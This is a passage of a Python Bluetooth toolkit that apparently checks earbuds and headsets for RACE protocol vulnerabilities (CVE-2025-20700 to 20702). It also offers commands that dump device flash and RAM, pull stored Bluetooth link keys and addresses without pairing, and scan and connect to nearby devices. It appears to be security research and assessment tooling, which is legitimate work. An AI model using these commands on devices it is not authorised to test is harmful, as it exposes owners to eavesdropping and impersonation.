                    "BLE Result: Device does not appear to expose RACE via BLE.")
                logging.info(
                    "  - CVE-2025-20700 (GATT auth bypass): NOT VULNERABLE")
                logging.info("  - CVE-2025-20702 via BLE: NOT VULNERABLE")
                await le_checker.close()
        else:
            logging.info(
                "The device does not seem to be available via BLE. "
                "It is probably not vulnerable to CVE-2025-20700!"
            )
            _get_vuln(vulnerabilities,
                      "CVE-2025-20700").status = VulnerabilityStatus.NOT_APPLICABLE
            _get_vuln(vulnerabilities,
                      "CVE-2025-20702_LE").status = VulnerabilityStatus.NOT_APPLICABLE
            await le_checker.close()

    # Ask user if they want to continue with Bluetooth Classic
    logging.info("")
    logging.info("-" * 60)
    logging.info(
        "Would you like to check Bluetooth Classic? [Y/n/q]: "
    )
    response = input().strip().lower()
    if response in ("q", "quit", "exit"):
        logging.info("Exiting.")
        _print_vulnerability_summary(vulnerabilities, bdaddr, controller)
        return
    if response in ("n", "no"):
        logging.info("Skipping Bluetooth Classic checks.")
        _print_vulnerability_summary(vulnerabilities, bdaddr, controller)
        return

    # Step 2: Classic Checks.
    # - if we have a BD addr supplied by user or retrieved via RACE we will take it
    # - if not, scan for Classic devices or ask the user
    # - if we have the address:
    #   - enumerate RFCOMM services and look for known UUIDs
    #   - try to read flash via RFCOMM
    logging.info("Step 2: Checking Bluetooth Classic connection")

    # Release the Bluetooth controller again before Step 2
    release_bluetooth_controller(controller)

    if not bdaddr:
        # Scan for Classic devices
        logging.info("No Bluetooth Classic address available, scanning...")
        classic_devices = await scan_classic_devices(controller, timeout=10.0)
        bdaddr = select_classic_device(classic_devices, None)
        if not bdaddr:
            logging.error(
                "Cannot proceed without a Bluetooth Classic address.")
            # Print summary of what we found so far
            _print_vulnerability_summary(vulnerabilities, bdaddr, controller)
            return
        # Need to release again after scanning
        release_bluetooth_controller(controller)

    # Ensure bdaddr is a string (it could be bytes from GetEDRAddressResponse)
    if isinstance(bdaddr, bytes):
        bdaddr = bdaddr.decode("ascii")
    bdaddr_str: str = str(bdaddr)
    classic_checker = RFCOMMBumbleChecker(controller, bdaddr_str, False)
    await classic_checker.setup()
    logging.info("Trying to find RACE SSP RFCOMM UUID.")

    check_classic = True
    uuid = None
    max_retries = 3
    retry_delay = 3.0  # Start with 3 seconds

    for attempt in range(max_retries + 1):
        try:
            uuid = await classic_checker.check_UUIDs()
            break  # Success, exit retry loop
        except Exception as e:  # pylint: disable=broad-exception-caught
            # Catch all exceptions including bumble.core.ConnectionError
            error_str = str(e).lower()
            if "limited_resources" in error_str:
                if attempt == 0:
                    logging.error(
                        "Connection rejected by remote device - "
                        "device has too many active connections."
                    )
                    logging.info(
                        "This usually means the target device needs time "
                        "to free up connection slots."
                    )
                else:
                    logging.warning("Retry %d/%d failed.",
                                    attempt, max_retries)

                if attempt < max_retries:
                    await classic_checker.close()
                    # Reset our controller just in case
                    reset_usb_bluetooth_controller(controller)
                    release_bluetooth_controller(controller)
                    logging.info(
                        "Waiting %.1f seconds before retry %d/%d...",
                        retry_delay, attempt + 1, max_retries
                    )
                    await asyncio.sleep(retry_delay)
                    retry_delay *= 1.5  # Exponential backoff
                    classic_checker = RFCOMMBumbleChecker(
                        controller, bdaddr_str, False)
                    await classic_checker.setup()
                else:
                    logging.error(
                        "All %d retries exhausted. The target device may be "
                        "busy or have too many connections.", max_retries
                    )
                    logging.info(
                        "Try again later or disconnect other devices from the "
                        "target."
                    )
                    logging.info(
                        "Skipping the rest of Bluetooth Classic checks."
                    )
                    check_classic = False
                    await classic_checker.close()
            elif "page_timeout" in error_str:
                logging.error(
                    "Device not responding. Is it powered on and in range?"
                )
                logging.info("Skipping the rest of Bluetooth Classic checks.")
                check_classic = False
                await classic_checker.close()
                break
            else:
                logging.error(
                    "Unable to create a Bluetooth Classic connection: %s", e
                )
                logging.info("Skipping the rest of Bluetooth Classic checks.")
                check_classic = False
                await classic_checker.close()
                break

    if check_classic:
        logging.info(
            "Checking Bluetooth Classic Pairing Issue by initiating an HfP connection."
        )
        auth_check = await classic_checker.check_auth_vuln()
        if auth_check:
            logging.info("Connection was successful without pairing!")
            _get_vuln(vulnerabilities,
                      "CVE-2025-20701").status = VulnerabilityStatus.VULNERABLE
        else:
            logging.info("Connection without pairing was not successful.")
            _get_vuln(vulnerabilities,
                      "CVE-2025-20701").status = VulnerabilityStatus.FIXED

        if uuid:
            logging.info("Trying to connect to RFCOMM RACE interface.")
            await classic_checker.close()

            rfcomm = RFCOMMTransport(
                controller, bdaddr_str, False, uuid=uuid)

            try:
                r = RACE(rfcomm, args.send_delay)
                await r.setup()

                logging.info("Trying to read flash via Bluetooth Classic.")
                d = RACEFlashDumper(r, 0x08000000, 0x1000)
                # try to dump with a 10-second timeout
                status = VulnerabilityStatus.FIXED
                try:
                    dump_data = await asyncio.wait_for(d.dump(), 10.0)
                    # Check if we got valid data or just error responses
                    if dump_data and _is_valid_dump(dump_data):
                        status = VulnerabilityStatus.VULNERABLE
                        collected_dumps["classic_flash"] = dump_data
                        # There might be the rare case that HfP is not possible
                        # without pairing, but RACE is? Then still vulnerable!
                        _get_vuln(vulnerabilities,
                                  "CVE-2025-20701").status = status
                    elif d.had_errors:
                        logging.warning(
                            "Flash dump had errors - device may have partial protections"
                        )
                    else:
                        logging.warning(
                            "Flash dump returned invalid/empty data"
                        )
                except asyncio.TimeoutError:
                    logging.warning(
                        "Timeout! Unable to dump flash within 10 seconds. "
                        "Device might be fixed!"
                    )
                except (OSError, ConnectionError, BrokenPipeError) as e:
                    logging.warning(
                        "Unable to dump flash. Device might be fixed! Error is %s", e
                    )
                _get_vuln(vulnerabilities,
                          "CVE-2025-20702_BR_EDR").status = status
                await rfcomm.close()
            except asyncio.CancelledError as e:
                logging.warning(
                    "Error connecting to device via RACE over RFCOMM (%s).", e
                )
                _get_vuln(
                    vulnerabilities, "CVE-2025-20702_BR_EDR").status = VulnerabilityStatus.FIXED

        else:
            logging.warning(
                "The device might not expose RACE via Bluetooth Classic!")
            _get_vuln(
                vulnerabilities, "CVE-2025-20702_BR_EDR").status = VulnerabilityStatus.FIXED

    _print_vulnerability_summary(vulnerabilities, bdaddr, controller)

    # Output collected firmware dumps
    if collected_dumps:
        # Combine all dumps (prefer classic over BLE if both exist)
        dump_data = collected_dumps.get(
            "classic_flash") or collected_dumps.get("ble_flash")
        if dump_data:
            if args.outfile:
                with open(args.outfile, "wb") as f:
                    f.write(dump_data)
                logging.info("Firmware dump saved to %s", args.outfile)
            else:
                logging.info("Firmware dump (hexdump):")
                hexdump(dump_data)
    else:
        logging.info("No firmware was successfully dumped during the check.")


async def command_ram(r: RACE, address: int, size: int, outfile: str, debug: bool):
    """Dump RAM memory from the target device."""
    if size % 0x4 != 0:
        logging.error(
            "Error! Address needs to be a multiple of 0x4 to be page-aligned!"
        )
        sys.exit()

    dumper = RACERAMDumper(r, address, size, progress=not debug)
    if outfile:
        with open(outfile, "wb") as f:
            await dumper.dump(fd=f)
    else:
        outbuf = await dumper.dump()
        hexdump(outbuf)


async def command_flash(r: RACE, address: int, size: int, outfile: str, debug: bool):
    """Dump flash memory from the target device."""
    if size % 0x100 != 0 or address % 0x100 != 0:
        logging.error(
            "Error! Address and size need to be multiples of 0x100 to be page-aligned!"
        )
        sys.exit()

    dumper = RACEFlashDumper(r, address, size, progress=not debug)
    if outfile:
        with open(outfile, "wb") as f:
            await dumper.dump(fd=f)
    else:
        outbuf = await dumper.dump()
        hexdump(outbuf)


async def command_link_keys(r: RACE, outfile: str):
    """Retrieve Bluetooth link keys from the target device."""
    logging.info("Sending get link key request")
    await r.setup()
    p = GetLinkKey()
    res = await r.send_sync(p)
    pkt = GetLinkKeyResponse.unpack(res)
    logging.info("Got link key response")

    if outfile:
        with open(outfile, "wb") as f:
            f.write(pkt.payload)
    else:
        logging.info("Found %d link keys:", pkt.num_of_devices)
        for i, key in enumerate(pkt.link_keys):
            logging.info("%d: %s", i, key.hex())


async def command_bdaddr(r: RACE, outfile: str):
    """Retrieve Bluetooth address from the target device."""
    logging.info("Sending get Bluetooth address request")
    await r.setup()
    p = GetEDRAddress()
    res = await r.send_sync(p)
    addr_pkt = GetEDRAddressResponse.unpack(res)
    logging.info("Got Bluetooth address response")

    if outfile:
        with open(outfile, "wb") as f:
            f.write(res)
    else:
        formatted_address = ":".join(
            f"{byte:02X}" for byte in addr_pkt.bd_addr)
        logging.info(formatted_address)


async def command_scan(args: argparse.Namespace):
    """Scan for nearby Bluetooth devices.

    Scans for Bluetooth Classic (BR/EDR) and/or BLE devices.
    Classic scan uses Extended Inquiry to get device names and class.
    """
    from bumble.device import Device, DeviceConfiguration
    from bumble.transport import open_transport_or_link
    from bumble.hci import Address, HCI_Write_Inquiry_Mode_Command

    controller = args.controller or "usb:0"
    mode = getattr(args, 'mode', 'classic')
    timeout = getattr(args, 'timeout', 10.0)
    use_extended = getattr(args, 'extended', False)

    # Release Bluetooth controller
    release_bluetooth_controller(controller)

    logging.info("=" * 60)
    logging.info("Bluetooth Device Scanner")
    logging.info("=" * 60)
    logging.info("")

    devices_found: dict[str, dict] = {}

    if mode in ("classic", "both"):
        logging.info("Scanning for Bluetooth Classic (BR/EDR) devices...")
        logging.info("  Duration: %.0f seconds", timeout)
        logging.info(
            "  Mode: %s", "Extended Inquiry" if use_extended else "Standard Inquiry")
        logging.info("")
        logging.info("NOTE: Standard inquiry only finds DISCOVERABLE devices.")
        logging.info(
            "To find non-discoverable devices, you need their address.")
        logging.info("")

        try:
            t = await open_transport_or_link(controller)
            config = DeviceConfiguration()
            config.keystore = "JsonKeyStore"
            config.address = Address.generate_static_address()
            config.name = "BTScanner"
            device = Device.from_config_with_hci(config, t.source, t.sink)
            device.classic_enabled = True
            await device.power_on()

            # Enable Extended Inquiry Mode for more info
            if use_extended:
                try:
                    # Mode 2 = Extended Inquiry Result with RSSI
                    await device.send_command(
                        HCI_Write_Inquiry_Mode_Command(inquiry_mode=2)
                    )
                    logging.debug("Extended Inquiry Mode enabled")
                except Exception as e:
                    logging.debug("Could not enable extended inquiry: %s", e)

            def on_inquiry_result(address, class_of_device, data, rssi):
                addr_str = str(address)

                # Parse Class of Device
                cod_major = (class_of_device >> 8) & 0x1F
                cod_minor = (class_of_device >> 2) & 0x3F
                major_classes = {
                    0: "Miscellaneous",
                    1: "Computer",
                    2: "Phone",
                    3: "LAN/Network",
                    4: "Audio/Video",
                    5: "Peripheral",
                    6: "Imaging",
                    7: "Wearable",
                    8: "Toy",
                    9: "Health",
                    31: "Uncategorized",
                }
                major_str = major_classes.get(
                    cod_major, f"Unknown({cod_major})")

                # Get name from EIR data
                name = data.get(0x09)  # Complete Local Name
                if not name:
                    name = data.get(0x08)  # Shortened Local Name
                if name:
                    if isinstance(name, bytes):
                        name = name.decode("utf-8", errors="replace")
                else:
                    name = "(unknown)"

                # Store device info
                if addr_str not in devices_found:
                    devices_found[addr_str] = {
                        "name": name,
                        "rssi": rssi,
                        "class": major_str,
                        "class_raw": class_of_device,
                        "type": "Classic"
                    }
                    logging.info(
                        "  Found: %s  %-20s  RSSI: %ddBm  Class: %s",
                        addr_str, name[:20], rssi if rssi else 0, major_str
                    )

            device.on("inquiry_result", on_inquiry_result)

            logging.info("-" * 60)
            await device.start_discovery()
            await asyncio.sleep(timeout)
            await device.stop_discovery()
            await t.close()
            logging.info("-" * 60)

        except Exception as e:
            logging.error("Classic scan failed: %s", e)

    if mode in ("ble", "both"):
        logging.info("")
        logging.info("Scanning for Bluetooth Low Energy (BLE) devices...")
        logging.info("  Duration: %.0f seconds", timeout)
        logging.info("")

        try:
            from bleak import BleakScanner

            def on_ble_device(device, adv_data):
                addr_str = device.address
                name = device.name or adv_data.local_name or "(unknown)"
                rssi = adv_data.rssi

                if addr_str not in devices_found:
                    devices_found[addr_str] = {
                        "name": name,
                        "rssi": rssi,
                        "class": "BLE",
                        "type": "BLE"
                    }
                    logging.info(
                        "  Found: %s  %-20s  RSSI: %ddBm",
                        addr_str, name[:20], rssi if rssi else 0
                    )

            scanner = BleakScanner(detection_callback=on_ble_device)
            logging.info("-" * 60)
            await scanner.start()
            await asyncio.sleep(timeout)
            await scanner.stop()
            logging.info("-" * 60)

        except ImportError:
            logging.error("BLE scanning requires 'bleak' package")
        except Exception as e:
            logging.error("BLE scan failed: %s", e)

    # Summary
    logging.info("")
    logging.info("=" * 60)
    logging.info("SCAN RESULTS: %d devices found", len(devices_found))
    logging.info("=" * 60)
    logging.info("")

    if devices_found:
        # Sort by RSSI (strongest first)
        sorted_devices = sorted(
            devices_found.items(),
            key=lambda x: x[1].get("rssi", -999) or -999,
            reverse=True
        )

        logging.info("%-18s  %-22s  %-8s  %-12s",
                     "ADDRESS", "NAME", "RSSI", "TYPE")
        logging.info("-" * 65)
        for addr, info in sorted_devices:
            logging.info(
                "%-18s  %-22s  %-8s  %-12s",
                addr,
                info["name"][:22],
                f"{info['rssi']}dBm" if info.get('rssi') else "N/A",
                info.get("class", info["type"])
            )
        logging.info("")
        logging.info("To connect to a device, use:")
        logging.info(
            "  python race_toolkit.py --target-address <ADDRESS> <command>")
    else:
        logging.info("No devices found.")
        logging.info("")
        logging.info("Tips:")
        logging.info("  - Make sure target devices are powered on")
        logging.info("  - Classic devices must be in DISCOVERABLE mode")
        logging.info("  - Try increasing --timeout")
        logging.info(
            "  - If you know the address, use --target-address directly")


async def command_sniff(args: argparse.Namespace):
    """Passive BLE advertisement sniffing with live table display.

    This is TRULY passive - we only listen for BLE advertisements without
    sending any packets. Similar to what nRF Connect app does.

    Note: For Bluetooth Classic, passive sniffing requires specialized
    hardware like Ubertooth One due to frequency hopping.
    """
    from bumble.device import Device, DeviceConfiguration
    from bumble.transport import open_transport_or_link
    from bumble.hci import (
        Address,
        HCI_LE_Set_Scan_Parameters_Command,
        HCI_LE_Set_Scan_Enable_Command,
    )
    from bumble.core import AdvertisingData
    import shutil

    controller = args.controller or "usb:0"
    timeout = getattr(args, 'timeout', 0)
    name_filter = getattr(args, 'filter', None)
    addr_filter = getattr(args, 'filter_addr', None)
    show_raw = getattr(args, 'show_raw', False)
    show_uuids = getattr(args, 'show_uuids', False)
    active_scan = getattr(args, 'active', False)

    # Release Bluetooth controller
    release_bluetooth_controller(controller)

    devices_seen: dict[str, dict] = {}
    packet_count = [0]
    start_time = [None]
    running = [True]
    enum_in_progress = [False]  # Track if enumeration is happening
    scan_paused_since = [None]  # Track when scanning was paused
    device = None
    t = None

    # Set up signal handler for clean Ctrl+C exit
    import signal

    def signal_handler(sig, frame):
        running[0] = False
    original_handler = signal.signal(signal.SIGINT, signal_handler)

    # Manufacturer company IDs
    COMPANIES = {
        0x004C: "Apple",
        0x0006: "Microsoft",
        0x00E0: "Google",
        0x0075: "Samsung",
        0x054C: "Sony",
        0x0310: "Xiaomi",
        0x0157: "Huawei",
        0x0171: "Amazon",
        0x0087: "Garmin",
        0x00D2: "Bose",
        0x0092: "JBL",
        0x0269: "Fitbit",
        0x02FF: "GN Audio (Jabra)",
    }

    def get_signal_bars(rssi: int) -> str:
        """Convert RSSI to signal strength bars."""
        if rssi >= -50:
            return "████"  # Excellent
        elif rssi >= -60:
            return "███░"  # Good
        elif rssi >= -70:
            return "██░░"  # Fair
        elif rssi >= -80:
            return "█░░░"  # Weak
        else:
            return "░░░░"  # Very weak

    def get_manufacturer(data: AdvertisingData) -> str:
        """Extract manufacturer from advertising data."""
        mfr_data = data.get(AdvertisingData.MANUFACTURER_SPECIFIC_DATA)
        if mfr_data and isinstance(mfr_data, bytes) and len(mfr_data) >= 2:
            company_id = struct.unpack('<H', mfr_data[:2])[0]
            return COMPANIES.get(company_id, "")
        return ""

    def clear_screen():
        """Clear terminal screen and reset cursor to top."""
        # Use both clear screen and move to home, plus clear scrollback
        import sys
        sys.stdout.write("\033[2J\033[H\033[3J")
        sys.stdout.flush()

    def move_cursor(row: int, col: int = 1):
        """Move cursor to position."""
        print(f"\033[{row};{col}H", end="", flush=True)

    def draw_table():
        """Draw the device table."""
        term_size = shutil.get_terminal_size((80, 24))
        width = term_size.columns
        height = term_size.lines

        clear_screen()

        # Header
        elapsed = time.time() - start_time[0] if start_time[0] else 0
        print("\033[1;36m" + "=" * width + "\033[0m")
        title = "  BLE ACTIVE SNIFFER  " if active_scan else "  BLE PASSIVE SNIFFER  "
        padding = (width - len(title)) // 2
        print("\033[1;36m" + " " * padding + title + " " * padding + "\033[0m")
        print("\033[1;36m" + "=" * width + "\033[0m")
        print()

        # Stats line with enumeration/scan status
        mode_str = "\033[1;33mACTIVE\033[0m" if active_scan else "\033[1;32mPASSIVE\033[0m"
        if enum_in_progress[0]:
            status_str = "  |  \033[1;35m⟳ ENUMERATING...\033[0m"
        elif scan_paused_since[0]:
            status_str = "  |  \033[1;31m⏸ SCAN PAUSED\033[0m"
        else:
            status_str = ""
        stats = f"  Mode: {mode_str}  |  Devices: \033[1;33m{len(devices_seen)}\033[0m  |  Packets: \033[1;33m{packet_count[0]}\033[0m  |  Time: \033[1;33m{elapsed:.0f}s\033[0m{status_str}"
        print(stats)
        print()

        # Table header - fixed width columns
        header = f"{'#':>3}  {'ADDRESS':<20}  {'RSSI':>7}  {'NAME':<20}  {'VENDOR':<14}  {'PKTS':>5}"
        print("\033[1;37;44m  " + header + "  \033[0m")

        # Sort devices by packet count (most active first)
        sorted_devices = sorted(
            devices_seen.items(),
            key=lambda x: x[1].get("count", 0),
            reverse=True
        )

        # Calculate how many rows we can show (minimum 10)
        # At least 10 devices, more if terminal is tall
        max_rows = max(10, height - 12)

        # Display devices
        for idx, (addr, info) in enumerate(sorted_devices[:max_rows], 1):
            rssi = info.get("rssi", -99)
            name = info.get("name", "(unknown)")[:24]
            vendor = info.get("vendor", "")[:16]
            pkts = info.get("count", 0)
            bars = get_signal_bars(rssi)
            last_seen = info.get("last_seen", 0)
            age = time.time() - last_seen if last_seen else 999

            # Color code by signal strength
            if rssi >= -50:
                color = "\033[1;32m"  # Green - excellent
            elif rssi >= -60:
                color = "\033[1;92m"  # Light green - good
            elif rssi >= -70:
                color = "\033[1;33m"  # Yellow - fair
            elif rssi >= -80:
                color = "\033[1;31m"  # Red - weak
            else:
                color = "\033[1;90m"  # Gray - very weak

            # Dim if not seen recently
            if age > 5:
                color = "\033[2m"  # Dim

            row = f"{idx:>3}  {addr:<20}  {rssi:>4}dBm  {name:<20}  {vendor:<14}  {pkts:>5}"
            print(f"{color}  {row}  \033[0m")

        # Fill remaining rows
        for _ in range(max_rows - len(sorted_devices[:max_rows])):
            print()

        # Footer
        print()
        print("\033[1;36m" + "-" * width + "\033[0m")
        print("  \033[1;33mPress Ctrl+C to stop and select a device\033[0m")
        print("\033[1;36m" + "-" * width + "\033[0m")

    def on_advertisement(advertisement):
        """Handle incoming BLE advertisement."""
        packet_count[0] += 1
        if start_time[0] is None:
            start_time[0] = time.time()

        addr_str = str(advertisement.address)
        rssi = advertisement.rssi

        # Apply filters
        if addr_filter and not addr_str.upper().startswith(addr_filter.upper()):
            return

        # Get name from advertisement data
        name = None
        vendor = ""
        if advertisement.data:
            name = advertisement.data.get(AdvertisingData.COMPLETE_LOCAL_NAME)
            if not name:
                name = advertisement.data.get(
                    AdvertisingData.SHORTENED_LOCAL_NAME)
            if name and isinstance(name, bytes):
                name = name.decode('utf-8', errors='replace')
            vendor = get_manufacturer(advertisement.data)

        if name_filter:
            if not name or name_filter.lower() not in name.lower():
                return

        # Update or add device
        existing = devices_seen.get(addr_str, {})
        devices_seen[addr_str] = {
            "name": name or existing.get("name") or "(unknown)",
            "rssi": rssi,
            "vendor": vendor or existing.get("vendor", ""),
            "last_seen": time.time(),
            "count": existing.get("count", 0) + 1,
            "raw_data": advertisement.data if show_raw else None,
        }

    try:
        t = await open_transport_or_link(controller)
        config = DeviceConfiguration()
        config.keystore = "JsonKeyStore"
        config.address = Address.generate_static_address()
        config.name = "BLESniffer"
        device = Device.from_config_with_hci(config, t.source, t.sink)
        await device.power_on()

        # Set scan parameters - PASSIVE (0) or ACTIVE (1)
        # Active scanning sends SCAN_REQ to get SCAN_RSP with device names
        # Passive scanning only listens, no transmissions
        scan_type = 1 if active_scan else 0
        await device.send_command(
            HCI_LE_Set_Scan_Parameters_Command(
                le_scan_type=scan_type,
                le_scan_interval=0x0010,
                le_scan_window=0x0010,
                own_address_type=0,
                scanning_filter_policy=0,
            )
        )

        # Register advertisement handler
        device.on('advertisement', on_advertisement)

        # Enable scanning
        await device.send_command(
            HCI_LE_Set_Scan_Enable_Command(
                le_scan_enable=1,
                filter_duplicates=0,
            )
        )

        start_time[0] = time.time()

        from bumble.device import Peer
        from bumble.gatt import (
            GATT_DEVICE_NAME_CHARACTERISTIC,
            GATT_APPEARANCE_CHARACTERISTIC,
            GATT_MANUFACTURER_NAME_STRING_CHARACTERISTIC,
            GATT_MODEL_NUMBER_STRING_CHARACTERISTIC,
        )

        # Appearance values for device type identification
        APPEARANCES = {
            64: "Phone", 128: "Computer", 192: "Watch", 256: "Clock",
            320: "Display", 384: "Remote", 640: "Media Player",
            960: "HID", 961: "Keyboard", 962: "Mouse", 963: "Joystick",
            964: "Gamepad", 1088: "Running Sensor", 1152: "Cycling",
            2112: "Audio Sink", 2113: "Speaker", 2176: "Audio Source",
            2240: "Wearable", 2241: "Wristwatch", 3136: "Pulse Oximeter",
            3200: "Weight Scale", 5184: "Hearing Aid",
        }

        async def enumerate_one_device(addr_str: str):
            """Try to enumerate a single device - runs in background."""
            if addr_str not in devices_seen:
                return

            info = devices_seen[addr_str]
            # Skip if already has a name
            if info.get("name") and info["name"] != "(unknown)":
                return

            connection = None
            try:
                # Stop scanning temporarily to connect
                scan_paused_since[0] = time.time()
                await device.send_command(
                    HCI_LE_Set_Scan_Enable_Command(
                        le_scan_enable=0, filter_duplicates=0)
                )

                clean_addr = addr_str.replace("/P", "")
                target = Address(clean_addr)

                connection = await asyncio.wait_for(
                    device.connect(target),
                    timeout=3.0  # Short timeout
                )

                peer = Peer(connection)
                try:
                    await asyncio.wait_for(peer.discover_services(), timeout=3.0)
                    await asyncio.wait_for(peer.discover_characteristics(), timeout=2.0)
                except asyncio.TimeoutError:
                    pass

                info["services_count"] = len(peer.services)
                info["connectable"] = True

                # Determine device type from services
                service_types = []
                for service in peer.services:
                    suuid = str(service.uuid).lower()
                    if "1812" in suuid:
                        service_types.append("HID")
                    elif "180d" in suuid:
                        service_types.append("Heart Rate")
                    elif "180f" in suuid:
                        service_types.append("Battery")
                    elif "1108" in suuid or "110b" in suuid or "110a" in suuid:
                        service_types.append("Audio")

                # Read key characteristics
                for service in peer.services:
                    for char in service.characteristics:
                        try:
                            if char.uuid == GATT_DEVICE_NAME_CHARACTERISTIC:
                                value = await asyncio.wait_for(peer.read_value(char), timeout=1.5)
                                if value:
                                    info["name"] = value.decode(
                                        'utf-8', errors='replace')
                            elif char.uuid == GATT_APPEARANCE_CHARACTERISTIC:
                                value = await asyncio.wait_for(peer.read_value(char), timeout=1.5)
                                if value and len(value) >= 2:
                                    app_val = struct.unpack('<H', value[:2])[0]
                                    info["appearance"] = APPEARANCES.get(
                                        app_val, f"0x{app_val:04X}")
                            elif char.uuid == GATT_MANUFACTURER_NAME_STRING_CHARACTERISTIC:
                                value = await asyncio.wait_for(peer.read_value(char), timeout=1.5)
                                if value:
                                    info["vendor"] = value.decode(
                                        'utf-8', errors='replace')
                            elif char.uuid == GATT_MODEL_NUMBER_STRING_CHARACTERISTIC:
                                value = await asyncio.wait_for(peer.read_value(char), timeout=1.5)
                                if value:
                                    info["model"] = value.decode(
                                        'utf-8', errors='replace')
                        except Exception:
                            pass

                if service_types:
                    info["device_type"] = "/".join(set(service_types))

            except asyncio.TimeoutError:
                info["connectable"] = False
            except Exception:
                info["connectable"] = False
            finally:
                try:
                    if connection:
                        await connection.disconnect()
                except Exception:
                    pass
                # Resume scanning
                try:
                    await device.send_command(
                        HCI_LE_Set_Scan_Enable_Command(
                            le_scan_enable=1, filter_duplicates=0)
                    )
                    scan_paused_since[0] = None
                except Exception:
                    pass
                enum_in_progress[0] = False

        async def maybe_enumerate_next():
            """Start enumerating the next unknown device if not busy."""
            if enum_in_progress[0]:
                return

            # Sort devices the same way as the table (by packet count, most active first)
            # This ensures we enumerate devices at the top of the table first
            sorted_for_enum = sorted(
                devices_seen.items(),
                key=lambda x: x[1].get("count", 0),
                reverse=True
            )

            # Find the first unknown device that we haven't tried yet
            for addr, info in sorted_for_enum:
                if info.get("connectable") is None and (not info.get("name") or info["name"] == "(unknown)"):
                    # Haven't tried this one yet and it's unknown
                    rssi = info.get("rssi", -999)
                    if rssi > -85:  # Only try devices with reasonable signal
                        enum_in_progress[0] = True
                        # Mark as tried (will update if successful)
                        info["connectable"] = False
                        asyncio.create_task(enumerate_one_device(addr))
                        return

        # Main loop - refresh display every second AND enumerate in background
        if timeout > 0:
            end_time = time.time() + timeout
            while time.time() < end_time and running[0]:
                draw_table()
                await maybe_enumerate_next()
                # Safety: if scanning has been paused for more than 15 seconds, force resume
                if scan_paused_since[0] and (time.time() - scan_paused_since[0]) > 15:
                    try:
                        await device.send_command(
                            HCI_LE_Set_Scan_Enable_Command(
                                le_scan_enable=1, filter_duplicates=0)
                        )
                        scan_paused_since[0] = None
                        enum_in_progress[0] = False
                    except Exception:
                        pass
                await asyncio.sleep(1)
        else:
            while running[0]:
                draw_table()
                await maybe_enumerate_next()
                # Safety: if scanning has been paused for more than 15 seconds, force resume
                if scan_paused_since[0] and (time.time() - scan_paused_since[0]) > 15:
                    try:
                        await device.send_command(
                            HCI_LE_Set_Scan_Enable_Command(
                                le_scan_enable=1, filter_duplicates=0)
                        )
                        scan_paused_since[0] = None
                        enum_in_progress[0] = False
                    except Exception:
                        pass
                await asyncio.sleep(1)

    except asyncio.CancelledError:
        pass
    except KeyboardInterrupt:
        pass
    except Exception as e:
        logging.error("Sniffing failed: %s", e)
        import traceback
        traceback.print_exc()
    finally:
        running[0] = False
        # Restore original signal handler
        try:
            signal.signal(signal.SIGINT, original_handler)
        except Exception:
            pass
        try:
            if device:
                await device.send_command(
                    HCI_LE_Set_Scan_Enable_Command(
                        le_scan_enable=0,
                        filter_duplicates=0,
                    )
                )
            # Close transport - enumeration already happened during scanning
            if t:
                await t.close()
        except Exception:
            pass

    # Clear screen and show final results
    clear_screen()
    print("\n\033[1;36m" + "=" * 70 + "\033[0m")
    print("\033[1;36m  SCAN COMPLETE\033[0m")
    print("\033[1;36m" + "=" * 70 + "\033[0m\n")

    elapsed = time.time() - start_time[0] if start_time[0] else 0
    print(f"  Duration: {elapsed:.1f} seconds")
    print(f"  Packets received: {packet_count[0]}")
    print(f"  Unique devices: {len(devices_seen)}\n")

    if not devices_seen:
        print("  No devices found.\n")
        return None

    # Sort by connectable + name + RSSI for final display
    def sort_key(item):
        addr, info = item
        has_name = 1 if info.get("name") and info["name"] != "(unknown)" else 0
        connectable = 1 if info.get("connectable") else 0
        rssi = info.get("rssi", -999)
        return (connectable, has_name, rssi)

    sorted_devices = sorted(devices_seen.items(), key=sort_key, reverse=True)

    # Count enumeration results
    connectable_count = sum(
        1 for _, info in devices_seen.items() if info.get("connectable"))
    named_count = sum(1 for _, info in devices_seen.items()
                      if info.get("name") and info["name"] != "(unknown)")

    print(
        f"  \033[1;36mDevices discovered:\033[0m {len(devices_seen)} total, {named_count} named, {connectable_count} connectable\n")

    # Display enriched selection table directly (no second enumeration phase)
    print("\033[1;37;44m" +
          f"  {'#':<3} {'ADDRESS':<20} {'RSSI':<7} {'NAME':<22} {'TYPE':<12} {'VENDOR':<15} {'SVCS':<4}" + "\033[0m")
    print()

    for idx, (addr, info) in enumerate(sorted_devices, 1):
        rssi = info.get("rssi", -99)
        name = info.get("name", "(unknown)")[:22]
        vendor = info.get("vendor", "")[:15]
        device_type = info.get("device_type", "")[:12]
        services = info.get("services_count", 0)
        connectable = info.get("connectable", False)

        # Color based on connectivity and signal
        if connectable:
            if rssi >= -60:
                color = "\033[1;32m"  # Green - connectable, strong
            elif rssi >= -80:
                color = "\033[1;33m"  # Yellow - connectable, medium
            else:
                color = "\033[0;33m"  # Dim yellow - connectable, weak
        else:
            color = "\033[1;90m"  # Gray - not connectable

        # Connection indicator
        conn_icon = "●" if connectable else "○"
        svcs_str = str(services) if services > 0 else "-"

        print(
            f"{color}  {idx:<3} {conn_icon} {addr:<20} {rssi:>4}dBm {name:<22} {device_type:<12} {vendor:<15} {svcs_str:<4}\033[0m")

    print()
    print("\033[1;36m" + "-" * 90 + "\033[0m")
    print(
        "  \033[1;32m●\033[0m = Connectable    \033[1;90m○\033[0m = Not connectable/timed out")

    # Device selection
    try:
        choice = input(
            "\n  \033[1;33mEnter device number to select (or press Enter to skip): \033[0m")
        if choice.strip():
            try:
                idx = int(choice.strip()) - 1
                if 0 <= idx < len(sorted_devices):
                    selected_addr, selected_info = sorted_devices[idx]
                    name = selected_info.get('name', 'unknown')
                    model = selected_info.get('model', '')
                    vendor = selected_info.get('vendor', '')

                    print(f"\n  \033[1;32mSelected: {selected_addr}\033[0m")
                    if name and name != "(unknown)":
                        print(f"  \033[1;37mName: {name}\033[0m")
                    if model:
                        print(f"  \033[1;37mModel: {model}\033[0m")
                    if vendor:
                        print(f"  \033[1;37mVendor: {vendor}\033[0m")
                    print(
                        f"\n  \033[1;37mYou can now use this address with other commands:\033[0m")
                    print(
                        f"  \033[1;36m  --target-address {selected_addr}\033[0m")
                    print(
                        f"  \033[1;36m  python race_toolkit.py -c usb:0 --target-address {selected_addr} ble-info\033[0m\n")
                    return selected_addr
                else:
                    print(f"\n  \033[1;31mInvalid selection.\033[0m\n")
            except ValueError:
                print(f"\n  \033[1;31mInvalid input.\033[0m\n")
    except (EOFError, KeyboardInterrupt):
        print("\n  \033[1;33mExiting...\033[0m\n")
